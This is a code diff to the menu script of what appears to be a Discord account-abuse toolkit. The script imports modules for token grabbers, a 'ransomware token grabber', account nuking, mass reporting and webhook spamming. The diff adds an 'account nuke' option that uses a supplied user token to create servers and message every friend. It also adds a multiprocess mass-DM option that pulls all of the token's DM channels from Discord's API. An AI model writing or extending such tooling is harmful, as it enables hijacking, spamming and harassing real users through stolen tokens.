@@ -15,6 +15,7 @@ from colorama import Fore
 from util.plugins.common import *
 from util.plugins.update import search_for_updates
 import util.accountNuke
+import util.accountNuke_no_StartSeizure
 import util.dmdeleter
 import util.info
 import util.login
@@ -29,6 +30,7 @@ import util.friend_blocker
 import util.create_token_grabber
 import util.unfriender
 import util.webhookspammer
+import util.channel_mass_dm
 import util.massdm
 import util.create_ransomware_token_grabber
 threads = 3
@@ -353,15 +355,7 @@ def main():
             main()
         util.massreport.MassReport(token, guild_id1, channel_id1, message_id1, reason1)
 
-
-    elif choice == "16":
-        token = input(
-            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
-        validateToken(token)
-        util.groupchat_spammer.GcSpammer(token)
-
-
-    elif choice == '17':
+    elif choice == '16':
         print(f'''
     {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Webhook Deleter
     {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Webhook Spammer    
@@ -391,9 +385,45 @@ def main():
             Message = str(input(
                 f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Message: {Fore.RED}'))
             util.webhookspammer.WebhookSpammer(WebHook, Message)
+        
+    elif choice == "17":
+        token = input(
+            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
+        validateToken(token)
+        util.groupchat_spammer.GcSpammer(token)
 
+    elif choice == "18":
+        token = input(
+            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
+        validateToken(token)
+        Server_Name = str(input(
+            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Name of the servers that will be created: {Fore.RED}'))
+        message_Content = str(input(
+            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Message that will be sent to every friend: {Fore.RED}'))
+        if threading.active_count() < threads:
+            threading.Thread(target=util.accountNuke_no_StartSeizure.Hazard_Nuke_no, args=(token, Server_Name, message_Content)).start()
+            return
 
-    elif choice == '18':
+    elif choice == "19":
+        token = input(
+            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
+        validateToken(token)
+        message = str(input(
+            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Message that will be sent to every friend: {Fore.RED}'))
+        processes = []
+        channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
+        for channel in [channelIds[i:i+3] for i in range(0, len(channelIds), 3)]:
+            t = multiprocessing.Process(target=util.channel_mass_dm.Mass_DM, args=(token, channel, message))
+            t.start()
+            processes.append(t)
+        while True:
+            if keyboard.is_pressed(cancel_key):
+                for process in processes:
+                    process.terminate()
+                main()
+                break
+
+    elif choice == '20':
         print(f'''
     {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Theme changer
     {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Amount of threads
